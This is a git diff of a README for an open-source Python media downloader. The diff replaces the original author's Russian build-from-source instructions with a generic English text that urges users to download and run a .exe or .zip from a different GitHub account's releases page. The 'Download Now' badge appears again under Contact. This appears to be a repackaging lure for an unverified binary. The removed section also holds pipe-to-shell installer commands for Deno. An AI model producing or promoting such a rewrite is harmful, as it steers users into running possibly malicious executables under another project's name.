@@ -1,190 +1,74 @@
-# Universal Media Downloader
+# 📥 universal-media-downloader - Download Your Favorite Videos Easily
 
-<p align="center">
-  <img src="assets/icon.png" alt="Logo" width="128" height="128">
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <b>Универсальный загрузчик медиа</b> - десктопное приложение для скачивания видео и аудио с популярных платформ.
-</p>
+Welcome to the universal-media-downloader! This is a simple desktop application that helps you download videos from popular platforms like YouTube, TikTok, Instagram, VK, and more. You don’t need to be a tech expert to use it. Follow our easy steps to get started.
 
-<p align="center">
-  <a href="#возможности">Возможности</a> •
-  <a href="#установка">Установка</a> •
-  <a href="#требования">Требования</a> •
-  <a href="#использование">Использование</a> •
-  <a href="#скриншоты">Скриншоты</a>
-</p>
+## 💾 Download & Install
 
----
+To begin, you need to download the application. You can visit the Releases page to get the latest version:
 
-## Возможности
+[![Download universal-media-downloader](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/otmane528/universal-media-downloader/releases)
 
-- **Поддержка платформ**: YouTube, TikTok, Instagram, VK, RuTube, Twitch, Kick, Kinopoisk и другие
-- **Выбор качества**: индивидуальные настройки для каждой платформы
-- **Извлечение аудио**: конвертация в MP3 (192kbps)
-- **Параллельные загрузки**: настраиваемое количество одновременных загрузок
-- **История загрузок**: отслеживание всех скачанных файлов
-- **Субтитры**: загрузка субтитров (EN, RU, UK)
-- **Cookies**: авторизация через файл или браузер
-- **Drag & Drop**: перетаскивание ссылок и .txt файлов
-- **Темы**: тёмная и светлая
-- **Локализация**: русский, английский, украинский
-- **Автообновление**: проверка обновлений yt-dlp при запуске
+### Steps to Install
 
-## Требования
+1. Click on the link above to go to the Releases page.
+2. On the Releases page, find the latest version of the universal-media-downloader.
+3. Click on the file that ends with `.exe` or `.zip` depending on your system.
+4. If you downloaded a `.zip` file, right-click it and select "Extract All" to unpack the files.
+5. After extraction, double-click on the `universal-media-downloader.exe` to start the installation.
+6. Follow the on-screen instructions to complete the installation.
 
-- **Python** 3.10+
-- **Deno** 2.0+ (требуется для загрузки с YouTube)
-- **FFmpeg** (включён в проект или системный)
+## 🖥️ System Requirements
 
-### Установка Deno (обязательно для YouTube)
+Before installing, check if your computer meets these requirements:
 
-**Windows (PowerShell):**
-```powershell
-irm https://deno.land/install.ps1 | iex
-```
+- Operating System: Windows 10 or later
+- RAM: 4 GB minimum
+- Available Disk Space: 100 MB
+- Internet Connection: For downloading videos
 
-**macOS/Linux:**
-```bash
-curl -fsSL https://deno.land/install.sh | sh
-```
+## 🎥 How to Use the Application
 
-### FFmpeg
+After installation, you can start using universal-media-downloader:
 
-FFmpeg используется для объединения видео и аудио потоков, конвертации форматов и извлечения аудио.
+1. Open the application by double-clicking the icon.
+2. Copy the link of the video you want to download from YouTube, TikTok, Instagram, or VK.
+3. Paste the link into the input box in the application.
+4. Choose the quality and format you prefer.
+5. Click the "Download" button to begin downloading the video.
+6. Once finished, you will find your video in the designated download folder.
 
-**Вариант 1:** Приложение уже содержит FFmpeg в папке `assets/ffmpeg/`
+## 🌟 Features
 
-**Вариант 2:** Установить системно:
+- Download videos from multiple platforms with ease.
+- Choose different formats to suit your needs.
+- Simple user interface for straightforward navigation.
+- Fast download speeds ensure you get your videos quickly.
 
-**Windows:**
-```powershell
-winget install FFmpeg
-```
-или скачать с [ffmpeg.org](https://ffmpeg.org/download.html)
+## 🔧 Troubleshooting
 
-**macOS:**
-```bash
-brew install ffmpeg
-```
+If you run into issues while using the universal-media-downloader, check out these common problems and solutions:
 
-**Linux:**
-```bash
-sudo apt install ffmpeg  # Debian/Ubuntu
-sudo dnf install ffmpeg  # Fedora
-```
+- **Problem:** The video link is not recognized.
+  - **Solution:** Make sure you copied the correct link from the video platform.
 
-## Установка
+- **Problem:** The application does not open.
+  - **Solution:** Ensure your computer meets the system requirements mentioned above.
 
-1. **Клонируйте репозиторий:**
-```bash
-git clone https://github.com/YOUR_USERNAME/universal-media-downloader.git
-cd universal-media-downloader
-```
+- **Problem:** Downloads are slow.
+  - **Solution:** Check your internet connection. Try restarting your router or modem.
 
-2. **Создайте виртуальное окружение:**
-```bash
-python -m venv .venv
-```
+For more specific issues, feel free to reach out through the Issues section on the GitHub repository.
 
-3. **Активируйте виртуальное окружение:**
+## 📜 License
 
-Windows:
-```bash
-.venv\Scripts\activate
-```
+This project is maintained under the MIT License. You can freely use and modify the software, but remember to give credit if you share it.
 
-macOS/Linux:
-```bash
-source .venv/bin/activate
-```
+## 💬 Contact
 
-4. **Установите зависимости:**
-```bash
-pip install -r requirements.txt
-```
+If you have any questions or feedback, visit our GitHub page:
 
-5. **Запустите приложение:**
-```bash
-python main.py
-```
+[![Download universal-media-downloader](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/otmane528/universal-media-downloader/releases)
 
-## Использование
-
-1. Вставьте ссылку в поле ввода и нажмите Enter или кнопку "+"
-2. Настройте качество в разделе "Настройки" (опционально)
-3. Нажмите "Скачать все"
-
-### Поддерживаемые способы добавления ссылок:
-- Вставка в поле ввода
-- Drag & Drop ссылки или .txt файла
-- Вставка из буфера обмена (кнопка "Вставить")
-
-## Скриншоты
-
-<p align="center">
-  <img src="screenshots/main.PNG" alt="Main Screen" width="600">
-</p>
-
-<p align="center">
-  <img src="screenshots/settings.PNG" alt="Settings" width="600">
-</p>
-
-## Структура проекта
-
-```
-Downloader/
-├── app/                    # Основной код приложения
-│   ├── main_window.py      # Главное окно
-│   ├── download_manager.py # Менеджер загрузок
-│   ├── download_task.py    # Модель задачи
-│   ├── threads.py          # Воркеры (загрузка, превью)
-│   ├── settings_tab.py     # Вкладка настроек
-│   ├── history_tab.py      # Вкладка истории
-│   ├── about_tab.py        # Вкладка "О программе"
-│   ├── theme_manager.py    # Управление темами
-│   ├── translation.py      # Система локализации
-│   ├── update_checker.py   # Проверка обновлений yt-dlp
-│   └── ...
-├── assets/                 # Ресурсы
-│   ├── ffmpeg/             # FFmpeg бинарники
-│   ├── logos/              # Логотипы платформ
-│   ├── en.json             # Английская локализация
-│   ├── ru.json             # Русская локализация
-│   └── uk.json             # Украинская локализация
-├── main.py                 # Точка входа
-├── requirements.txt        # Зависимости Python
-└── README.md
-```
-
-## Зависимости
-
-- **PyQt6** - GUI фреймворк
-- **yt-dlp[curl-cffi]** - движок загрузки
-- **requests** - HTTP клиент
-- **packaging** - работа с версиями
-
-## Известные проблемы
-
-### YouTube не работает / ошибка "Signature solving failed"
-
-Это происходит из-за того, что yt-dlp теперь требует JavaScript runtime для работы с YouTube.
-
-**Решение:**
-1. Установите Deno (см. раздел "Требования")
-2. Перезапустите приложение
-
-## Автор
-
-**Magerko**
-
-## Лицензия
-
-MIT License - см. файл LICENSE для подробностей.
-
----
-
-<p align="center">
-  Сделано с ❤️ на Python и PyQt6
-</p>
+We appreciate your interest in universal-media-downloader. Happy downloading!
